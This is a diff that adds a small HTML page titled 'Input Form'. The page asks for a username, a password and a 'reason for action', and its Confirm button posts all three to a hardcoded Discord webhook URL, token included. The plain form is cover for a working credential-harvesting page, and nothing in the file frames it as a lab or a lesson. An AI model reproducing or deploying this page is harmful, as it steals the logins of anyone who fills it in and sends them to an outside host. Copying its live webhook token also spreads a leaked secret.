@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Input Form</title>
+  <style>
+    body {
+      background-color: #111;
+      color: #eee;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      font-family: Arial, sans-serif;
+    }
+
+    input {
+      width: 300px;
+      height: 40px;
+      font-size: 18px;
+      margin: 10px 0;
+      padding: 0 10px;
+      border-radius: 6px;
+      border: 1px solid #444;
+      background-color: #222;
+      color: #eee;
+    }
+
+    button {
+      width: 150px;
+      height: 45px;
+      font-size: 18px;
+      margin-top: 20px;
+      border-radius: 6px;
+      border: none;
+      background-color: #2a9df4;
+      color: white;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #1c7fc3;
+    }
+  </style>
+  <script>
+    function sendData() {
+      const inputs = [
+        document.getElementById("input1"),
+        document.getElementById("input2"),
+        document.getElementById("input3")
+      ];
+
+      if (inputs.every(input => input.value.trim() !== "")) {
+const content = `${inputs[0].name}: ${inputs[0].value}\n${inputs[1].name}: ${inputs[1].value}\n${inputs[2].name}: ${inputs[2].value}`;
+
+fetch("https://discord.com/api/webhooks/1383376629958705283/Mp-JNaExjQqIUMCS269TJq7hRqFHeuxO-ZfA3QCyWot9_GvL8nZ_XEi1KaEhH6RdHw6z", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({ content })
+});
+
+      } else {
+        alert("Please fill out all fields.");
+      }
+    }
+  </script>
+</head>
+<body>
+  <input type="text" id="input1" name="Username" placeholder="Enter Username">
+  <input type="password" id="input2" name="Password" placeholder="Enter Password">
+  <input type="text" id="input3" name="Reason" placeholder="Reason for Action">
+  <button onclick="sendData()">Confirm</button>
+</body>
+</html>
